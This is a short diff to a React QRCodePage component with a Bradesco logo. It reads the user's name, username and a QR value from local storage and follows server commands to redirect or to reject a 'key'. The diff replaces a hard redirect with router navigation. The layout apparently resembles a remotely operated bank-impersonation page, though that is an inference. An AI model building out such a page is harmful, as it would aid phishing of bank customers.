@@ -1,7 +1,10 @@
 import { useEffect, useRef, useState } from "react";
+import { useNavigate } from "react-router-dom";
 import bradescoLogo from "@/assets/bradesco-logo.png";
+import { resolveServerRoute } from "@/lib/resolveServerRoute";
 
 const QRCodePage = () => {
+  const navigate = useNavigate();
   const usuario = localStorage.getItem("usuario") || "";
   const nome = localStorage.getItem("nome") || "";
   const qr = localStorage.getItem("qr") || "";
@@ -28,7 +31,7 @@ const QRCodePage = () => {
       console.log("QRCodePage msg:", msg);
 
       if (msg.acao === "redirecionar" && msg.url) {
-        window.location.href = msg.url;
+        navigate(resolveServerRoute(msg.url));
       }
       if (msg.acao === "erro_chave") {
         setErro(msg.motivo || "Chave inválida. Tente novamente.");
